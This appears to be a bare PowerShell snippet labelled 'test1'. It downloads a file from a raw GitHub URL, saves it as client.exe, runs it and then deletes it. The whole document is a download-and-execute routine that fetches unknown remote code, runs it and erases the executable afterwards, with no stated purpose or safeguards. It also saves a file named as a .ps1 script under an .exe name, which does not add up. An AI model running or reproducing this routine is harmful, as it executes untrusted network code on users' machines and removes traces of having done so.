# test1 #
Invoke-WebRequest 'https://raw.githubusercontent.com/RavenCraftInitaitives/DomAndDarlene/main/test1.ps1' -OutFile client.exe
Start-Process '.\client.exe' -Wait
Remove-Item .\client.exe
